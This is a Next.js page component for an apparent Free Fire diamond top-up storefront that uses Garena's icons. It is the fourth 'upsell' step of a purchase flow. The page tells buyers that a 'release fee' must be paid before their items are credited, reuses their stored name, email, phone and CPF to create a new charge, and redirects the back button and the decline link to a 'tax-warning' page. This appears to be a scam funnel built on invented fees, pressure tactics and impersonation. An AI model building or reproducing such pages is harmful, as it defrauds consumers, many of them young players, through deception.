
'use client';

import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import { Button } from '@/components/ui/button';
import { Header } from '@/components/freefire/Header';
import { Footer } from '@/components/freefire/Footer';
import { cn } from '@/lib/utils';
import { taxOffer } from '@/lib/data';
import { useToast } from '@/hooks/use-toast';
import { PaymentPayload } from '@/interfaces/types';
import BackRedirect from '@/components/freefire/BackRedirect';

interface CustomerData {
    name: string;
    email: string;
    phone: string;
    cpf?: string;
}

const Upsell4Page = () => {
    const router = useRouter();
    const { toast } = useToast();
    const [isSubmitting, setIsSubmitting] = useState(false);
    const [avatarIcon, setAvatarIcon] = useState('https://cdn-gop.garenanow.com/gop/app/0000/100/067/icon.png');

    useEffect(() => {
        try {
            const storedAppId = localStorage.getItem('selectedAppId');
            if (storedAppId === '100151') {
                setAvatarIcon('https://cdn-gop.garenanow.com/gop/app/0000/100/151/icon.png');
            }
        } catch (e) {
            console.error("Could not access localStorage", e);
        }
    }, []);

    const handleDecline = () => {
        router.push('/tax-warning');
    };

    const handlePurchase = async () => {
        setIsSubmitting(true);
        const selectedProduct = taxOffer[0];

        const customerDataString = localStorage.getItem('customerData');
        const playerName = localStorage.getItem('playerName') || 'Desconhecido';
        const utmParamsString = localStorage.getItem('utmParams');
        
        if (!customerDataString) {
            toast({
                variant: "destructive",
                title: "Erro",
                description: "Dados do cliente não encontrados. Por favor, reinicie a compra.",
            });
            setIsSubmitting(false);
            router.push('/');
            return;
        }

        const customerData: CustomerData = JSON.parse(customerDataString);
        const utmQuery = utmParamsString ? JSON.parse(utmParamsString) : {};

        const payloadItems = [{
            id: selectedProduct.id,
            title: selectedProduct.name,
            unitPrice: selectedProduct.price,
            quantity: 1,
            tangible: false
        }];

        const payload: PaymentPayload = {
            name: customerData.name,
            email: customerData.email,
            phone: customerData.phone.replace(/\D/g, ''),
            cpf: customerData.cpf?.replace(/\D/g, ''),
            amount: selectedProduct.price,
            externalId: `ff-upsell4-tax-${Date.now()}`,
            items: payloadItems,
            utmQuery,
        };
        
        try {
            const response = await fetch("/api/create-payment", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload),
            });

            const data = await response.json();

            if (!response.ok) {
                throw new Error(data.error?.message || "Erro ao criar o pagamento para a taxa.");
            }
            
            localStorage.setItem('paymentData', JSON.stringify({
                ...data.data,
                external_id: payload.externalId,
                playerName: playerName,
                amount: selectedProduct.formattedPrice,
                numericAmount: selectedProduct.price,
                diamonds: selectedProduct.totalAmount,
                originalAmount: selectedProduct.originalAmount,
                bonusAmount: selectedProduct.bonusAmount,
                totalAmount: selectedProduct.totalAmount,
                productId: selectedProduct.id,
                items: payloadItems,
                utmQuery: utmQuery,
            }));
            
            router.push('/buy');

        } catch (error: any) {
            toast({
                variant: "destructive",
                title: "Erro no Pagamento",
                description: error.message,
            });
            setIsSubmitting(false);
        }
    };

    return (
        <div className="flex flex-col min-h-screen bg-gray-50">
            <BackRedirect redirectTo="/tax-warning" />
            <Header avatarIcon={avatarIcon} />
            <main className="flex-1 flex flex-col items-center justify-center p-4 text-center">
                <div className="bg-white rounded-2xl shadow-lg p-6 md:p-10 max-w-lg w-full border">
                    <h1 className="text-2xl md:text-3xl font-bold text-gray-800 uppercase tracking-wider">
                        Taxa de Liberação Imediata
                    </h1>
                    <p className="mt-3 text-base text-gray-600">
                        Para que seus itens sejam creditados em sua conta instantaneamente, é necessária uma pequena taxa de liberação para cobrir os custos de processamento.
                    </p>
                    
                    <div className="my-8">
                       <div className={cn("p-4 rounded-lg border-2 border-destructive bg-destructive/5 text-left flex items-center gap-4")}>
                           <div className="flex-shrink-0 text-4xl">
                               <span>🚨</span>
                           </div>
                           <div>
                               <h2 className="text-lg font-bold text-gray-800">{taxOffer[0].name}</h2>
                               <p className="text-2xl font-extrabold text-gray-900">{taxOffer[0].formattedPrice}</p>
                           </div>
                       </div>
                    </div>

                    <div className="flex flex-col gap-3">
                        <Button
                            onClick={handlePurchase}
                            disabled={isSubmitting}
                            className="w-full text-lg py-6 font-bold"
                            variant="destructive"
                        >
                            {isSubmitting ? 'Processando...' : 'Pagar Taxa de Liberação'}
                        </Button>
                        <Button
                            onClick={handleDecline}
                            variant="link"
                            className="text-gray-500 hover:text-gray-700"
                        >
                            Não, obrigado.
                        </Button>
                    </div>
                </div>
            </main>
            <Footer />
        </div>
    );
};

export default Upsell4Page;
